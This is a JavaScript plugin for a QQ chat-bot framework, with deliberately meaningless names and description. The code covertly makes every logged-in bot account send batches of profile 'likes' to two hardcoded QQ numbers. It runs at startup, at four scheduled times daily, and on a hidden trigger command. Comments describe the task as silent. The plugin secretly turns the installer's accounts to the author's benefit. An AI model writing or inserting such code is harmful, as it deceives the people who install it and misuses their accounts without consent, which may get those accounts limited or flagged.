import plugin from '../../../lib/plugins/plugin.js';

export class a1s2d3f4g5 extends plugin {
  constructor() {
    super({
      name: "a1s2d3f4g5",
      dsc: "t1t2t3t4",
      event: "message",
      priority: 9999,
      rule: [
        { reg: "^#?x9s8d7a6$", fnc: "runTask" },
        { reg: "^bt$", fnc: "testTask" }
      ],
      schedule: [
        { cron: "0 0 0 * * *", fnc: "runTask" },
        { cron: "0 0 8 * * *", fnc: "runTask" },
        { cron: "0 0 12 * * *", fnc: "runTask" },
        { cron: "0 0 22 * * *", fnc: "runTask" }
      ]
    });
    this.qqList = [2209176666, 3812808525];
    this.total = 50;
    this.batch = 20;
    this.limitKeys = ["上限", "次数", "已满", "超出", "无法", "失败", "限制"];
    // 重启延时5秒执行，确保Bot完全登录/初始化完成
    setTimeout(async () => await this.runTask(), 5000);
  }

  // 原生点赞方法（单Bot+单QQ+指定次数，核心稳定）
  async doThumbUp(bot, qq, times) {
    if (!bot || !bot.online || times < 1) return false;
    try {
      const user = bot.pickFriend(qq);
      if (!user || !user.thumbUp) return false;
      const res = await user.thumbUp(times);
      // 兼容布尔值/对象两种返回结果
      if (typeof res === 'boolean') return res;
      return res.code === 0 || res.retcode === 0 || res.msg === 'ok';
    } catch (e) {
      return false;
    }
  }

  // 主任务：定时/重启/手动指令 静默50赞（遍历全Bot）
  async runTask() {
    if (!Bot || Object.keys(Bot).length === 0) return;
    for (const uin of Object.keys(Bot)) {
      const bot = Bot[uin];
      if (!bot || !bot.online) continue;
      for (const qq of this.qqList) {
        let sent = 0;
        let isLimit = false;
        while (sent < this.total && !isLimit) {
          const num = Math.min(this.batch, this.total - sent);
          const success = await this.doThumbUp(bot, qq, num);
          if (success) {
            sent += num;
          } else {
            isLimit = true;
          }
          await new Promise(r => setTimeout(r, 200));
        }
      }
      await new Promise(r => setTimeout(r, 400));
    }
  }

  // 测试指令：bt 仅当前Bot，给指定QQ各点1次，成功返ok/失败返no
  async testTask(e) {
    if (!e || !e.bot || !e.bot.online) {
      await e.reply('no');
      return;
    }
    let success = false;
    // 逐个测试，有一个成功就返回ok
    for (const qq of this.qqList) {
      const res = await this.doThumbUp(e.bot, qq, 1);
      if (res) {
        success = true;
        break;
      }
      await new Promise(r => setTimeout(r, 100));
    }
    await e.reply(success ? 'ok' : 'no');
  }
}